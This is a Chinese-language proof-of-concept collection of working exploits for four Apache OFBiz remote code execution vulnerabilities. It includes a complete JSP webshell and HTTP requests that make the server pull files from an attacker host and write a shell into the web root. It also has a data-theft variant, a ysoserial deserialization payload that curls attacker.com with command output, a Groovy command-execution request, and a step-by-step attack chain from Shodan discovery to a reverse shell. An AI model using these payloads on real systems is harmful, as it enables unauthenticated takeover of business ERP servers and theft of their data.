# Apache OFBiz 漏洞 POC

## 系统简介

Apache OFBiz（Open For Business）是一款开源企业资源规划（ERP）系统，提供订单管理、库存、财务等功能。

---

## CVE-2024-45195 — 未认证远程代码执行（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-45195 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | 授权绕过 → 远程代码执行 |
| 认证要求 | 无需认证 |
| 影响版本 | Apache OFBiz < 18.12.16 |
| 修复版本 | 18.12.16 |

### 漏洞原理

**根本原因：控制器-视图映射状态不同步（Controller-View Map Desynchronization）**

OFBiz 通过多种不同方法解析 URI 来提取控制器和视图，导致状态碎片化：
- `requestUri` 被设置为未认证端点
- `overrideViewUri` 被设置为需认证的管理视图

认证检查仅针对控制器（requestUri），而不验证视图（overrideViewUri），攻击者可利用此差异访问管理员视图。

这是对以下三个历史 CVE 的补丁绕过：
- **CVE-2024-32113**: 路径遍历 `../`
- **CVE-2024-36104**: 分号注入 `;/` 和编码点 `%2e%2e`
- **CVE-2024-38856**: 直接路径拼接（无需特殊字符）

### 攻击步骤

#### 第一步：准备服务器文件

**rceschema.xml**（数据格式定义文件）：
```xml
<data-files xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <data-file name="rce" separator-style="fixed-length" type-code="text" encoding-type="UTF-8">
    <record name="rceentry" limit="many">
      <field name="jsp" type="String" length="605" position="0"/>
    </record>
  </data-file>
</data-files>
```

**rcereport.csv**（JSP Webshell，需精确为 605 字节）：
```jsp
<%@ page import='java.io.*' %><%@ page import='java.util.*' %><h1>Shell</h1><%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  String[] cmdArray = {"/bin/sh", "-c", cmd};
  Process p = Runtime.getRuntime().exec(cmdArray);
  InputStream in = p.getInputStream();
  BufferedReader br = new BufferedReader(new InputStreamReader(in));
  String line;
  while ((line = br.readLine()) != null) {
    out.println(line + "<br>");
  }
}
%>
```

#### 第二步：利用 xmldsdump 写入 Webshell

```http
POST /webtools/control/forgotPassword/viewdatafile HTTP/2
Host: target:8443
Content-Type: application/x-www-form-urlencoded

DATAFILE_LOCATION=http://attacker:80/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://attacker:80/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce
```

#### 第三步：访问 Webshell

```
GET /accounting/control/main/index.jsp?cmd=id HTTP/1.1
Host: target:8443
```

### POC — 数据泄露（读取数据库内容）

```http
POST /webtools/control/forgotPassword/xmldsdump HTTP/2
Host: target:8443
Content-Type: application/x-www-form-urlencoded

DATAFILE_LOCATION=http://attacker:80/rcereport.csv&DATAFILE_SAVE=./themes/common-theme/webapp/common-theme/stolen.txt&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://attacker:80/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce
```

---

## CVE-2024-38856 — 未认证远程代码执行（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-38856 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | 授权绕过 → RCE |
| 认证要求 | 无需认证 |
| 影响版本 | OFBiz <= 18.12.14 |

利用直接路径拼接绕过认证，无需特殊字符即可触发。

---

## CVE-2023-49070 — XML-RPC 反序列化预认证 RCE（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2023-49070 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | Java 反序列化 → RCE |
| 认证要求 | 无需认证 |
| 影响版本 | OFBiz < 18.12.10 |

### 漏洞原理

XML-RPC 组件对攻击者控制的数据进行 Java 对象反序列化，触发任意代码执行。是 CVE-2020-9496 的绕过变体。

### POC

```http
POST /webtools/control/main?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Host: target:443
Content-Type: application/xml

<?xml version="1.0"?>
<methodCall><methodName>Test</methodName>
<params><param><value><struct><member>
<name>arg1</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
[BASE64_ENCODED_YSOSERIAL_PAYLOAD]
</serializable></value></member></struct></value></param></params>
</methodCall>
```

```bash
# 生成 ysoserial payload
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/\$(id)" | base64
```

---

## CVE-2024-32113 — 路径遍历 → Groovy 脚本 RCE（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-32113 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | 路径遍历 + Groovy 脚本执行 |
| 认证要求 | 无需认证 |
| 影响版本 | OFBiz < 18.12.13 |

### POC

```http
GET /webtools/control/main/ProgramExport;jsessionid=x?USERNAME=&PASSWORD=&requirePasswordChange=Y&groovyProgram=throw+new+Exception('id'.execute().text) HTTP/1.1
Host: target:8443
```

---

## 完整攻击链

1. 发现 OFBiz 实例（Shodan: `http.title:"OFBiz"`）
2. 发送未认证请求绕过认证（路径遍历 / `requirePasswordChange=Y` / override view）
3. 到达 `ProgramExport` 端点或 XML-RPC 反序列化端点
4. 执行 Groovy 脚本（`"id".execute().text`）或 ysoserial payload
5. 写入 webshell 或建立反弹 shell

### 参考资料

- [Rapid7 CVE-2024-45195 分析](https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/)
- [BleepingComputer](https://www.bleepingcomputer.com/news/security/apache-fixes-critical-ofbiz-remote-code-execution-vulnerability/)
- [NVD CVE-2024-45195](https://nvd.nist.gov/vuln/detail/cve-2024-45195)
- [NVD CVE-2024-38856](https://nvd.nist.gov/vuln/detail/CVE-2024-38856)
- [GitHub Scanner CVE-2024-38856](https://github.com/securelayer7/CVE-2024-38856_Scanner)
- [CertCube CVE-2024-38856](https://blog.certcube.com/cve-2024-38856-rce-vulnerability-in-apache-ofbiz/)
